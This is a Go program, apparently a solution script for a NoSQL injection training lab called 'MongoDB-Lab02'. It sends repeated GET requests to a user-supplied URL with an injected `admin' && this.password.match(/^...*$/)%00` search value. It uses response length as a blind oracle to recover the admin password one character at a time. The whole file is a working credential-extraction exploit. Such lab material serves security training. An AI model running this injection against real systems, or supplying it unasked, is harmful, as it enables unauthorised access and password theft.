package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/akamensky/argparse"
)

var (
	endpoint string
	payload  string

	// how to create an slice with 0 to 9 and a to z and character -
	// https://stackoverflow.com/questions/37532255/how-to-generate-a-slice-of-runes-containing-all-letters
)

func main() {

	parser := argparse.NewParser("MongoDB-Lab02", "NoSQL Lab02")
	u := parser.String("u", "url", &argparse.Options{Required: true, Help: "Base url"})
	err := parser.Parse(os.Args)

	if err != nil {
		log.Fatal(parser.Usage(err))
	}

	url := *u
	// Fuzzing the url with letters
	log.Println("\033[1;32m[+]\033[0m Fuzzing the url with chars, please wait...")
	for {

		if len(payload) == 36 {
			log.Println("\033[1;32m[+]\033[0m Password found:", payload)
			os.Exit(0)
		}

		for i := 0; i < 10; i++ {
			endpoint = fmt.Sprintf("%s%s%s%s%s", url, "?search=admin'%20%26%26%20this.password.match(/^", payload, strconv.Itoa(i), ".*$/)%00")

			// Sending the request
			resp, err := http.Get(endpoint)

			if err != nil {
				log.Fatal(err)
			}

			body, _ := ioutil.ReadAll(resp.Body)

			if len(body) > 1600 {
				payload = payload + strconv.Itoa(i)
			}
		}

		for i := 'a'; i <= 'z'; i++ {
			endpoint = fmt.Sprintf("%s%s%s%s%s", url, "?search=admin'%20%26%26%20this.password.match(/^", payload, string(i), ".*$/)%00")

			// Sending the request
			resp, err := http.Get(endpoint)

			if err != nil {
				log.Fatal(err)
			}

			body, _ := ioutil.ReadAll(resp.Body)

			if len(body) > 1600 {
				payload = payload + string(i)
			}
		}

		endpoint = fmt.Sprintf("%s%s%s%s%s", url, "?search=admin'%20%26%26%20this.password.match(/^", payload, "-", ".*$/)%00")

		// Sending the request
		resp, err := http.Get(endpoint)

		if err != nil {
			log.Fatal(err)
		}

		body, _ := ioutil.ReadAll(resp.Body)

		if len(body) > 1600 {
			payload = payload + "-"
		}

	}

}
